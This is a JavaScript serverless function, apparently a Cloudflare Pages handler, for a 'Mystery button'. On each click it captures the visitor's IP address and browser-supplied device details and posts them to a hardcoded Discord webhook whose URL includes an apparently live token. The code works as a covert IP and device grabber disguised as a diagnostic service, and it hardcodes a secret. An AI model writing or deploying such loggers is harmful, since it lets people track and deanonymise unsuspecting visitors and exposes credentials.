export async function onRequest(context) {
  const { request } = context;

  if (request.method === 'GET') {
    return new Response(
      JSON.stringify({
        ok: true,
        message: 'Mystery button API is online'
      }),
      {
        status: 200,
        headers: {
          'Content-Type': 'application/json'
        }
      }
    );
  }

  if (request.method !== 'POST') {
    return new Response(
      JSON.stringify({
        ok: false,
        error: 'Method not allowed'
      }),
      {
        status: 405,
        headers: {
          'Content-Type': 'application/json',
          'Allow': 'GET, POST'
        }
      }
    );
  }

  /*
   * PUT YOUR DISCORD WEBHOOK HERE
   *
   * IMPORTANT:
   * This is intentionally hardcoded because you asked
   * to return to the old/simple version.
   */
  const webhook =
    'https://discord.com/api/webhooks/1544799468476563506/CnL5_J1Lzv6dDdtoyVwVNjDKETvWu84m-c-wLcQjpwm3xEFcKKaEFZ5d1qIw1AjQSAvd';

  if (!webhook || webhook === 'YOUR_NEW_DISCORD_WEBHOOK_HERE') {
    return new Response(
      JSON.stringify({
        ok: false,
        error: 'Discord webhook has not been configured'
      }),
      {
        status: 500,
        headers: {
          'Content-Type': 'application/json'
        }
      }
    );
  }

  let body;

  try {
    body = await request.json();
  } catch {
    return new Response(
      JSON.stringify({
        ok: false,
        error: 'Invalid JSON request'
      }),
      {
        status: 400,
        headers: {
          'Content-Type': 'application/json'
        }
      }
    );
  }

  const deviceInfo =
    body?.deviceInfo || {};

  const ip =
    request.headers.get('CF-Connecting-IP') ||
    request.headers.get('X-Forwarded-For') ||
    'Unavailable';

  const fields = [
    {
      name: 'IP Address',
      value: String(ip).slice(0, 1024),
      inline: true
    }
  ];

  for (const [name, value] of Object.entries(deviceInfo)) {
    fields.push({
      name: String(name).slice(0, 256),
      value: String(value).slice(0, 1024),
      inline: true
    });
  }

  const discordPayload = {
    content: 'button clicked',

    embeds: [
      {
        title: '🔴 Mystery Button Clicked',

        description:
          'Public browser/device information collected from diagnostic.run',

        fields: fields.slice(0, 25),

        timestamp:
          new Date().toISOString()
      }
    ]
  };

  try {
    const discordResponse =
      await fetch(webhook, {
        method: 'POST',

        headers: {
          'Content-Type': 'application/json'
        },

        body: JSON.stringify(
          discordPayload
        )
      });

    if (!discordResponse.ok) {
      const errorText =
        await discordResponse.text();

      console.error(
        'Discord webhook failed:',
        discordResponse.status,
        errorText
      );

      return new Response(
        JSON.stringify({
          ok: false,
          error:
            `Discord returned ${discordResponse.status}`
        }),
        {
          status: 502,
          headers: {
            'Content-Type': 'application/json'
          }
        }
      );
    }

    return new Response(
      JSON.stringify({
        ok: true,
        message: 'Sent to Discord'
      }),
      {
        status: 200,
        headers: {
          'Content-Type': 'application/json'
        }
      }
    );

  } catch (error) {

    console.error(
      'Discord request error:',
      error
    );

    return new Response(
      JSON.stringify({
        ok: false,
        error: 'Could not contact Discord'
      }),
      {
        status: 502,
        headers: {
          'Content-Type': 'application/json'
        }
      }
    );
  }
}
